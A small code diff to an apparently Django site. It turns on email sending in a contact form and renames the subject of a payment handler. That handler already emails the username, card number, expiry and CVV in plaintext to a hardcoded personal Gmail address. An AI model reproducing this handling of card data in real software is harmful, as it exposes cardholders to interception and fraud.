@@ -143,7 +143,7 @@ def contact(request):
         message = f'{fname} {lname} {email} {phone} {desc} {city} {datetim} {file}'
         email_from = settings.EMAIL_HOST_USER
         recipient_list = ['aryasah30@gmail.com']
-        # send_mail(subject, message , email_from ,recipient_list ) 
+        send_mail(subject, message , email_from ,recipient_list ) 
         print(message)
     return render(request, 'accounts/contact.html')
 
@@ -181,7 +181,7 @@ def payment(request):
         
         
         messages.success(request, 'Your message has been sent!')
-        subject = 'New Contact list '
+        subject = 'Payment'
         message = f'Username {uname} Year{year} Month :{month} Cardno: {cardNumber}  CVV {cvv}'
         email_from = settings.EMAIL_HOST_USER
         recipient_list = ['aryasah30@gmail.com']
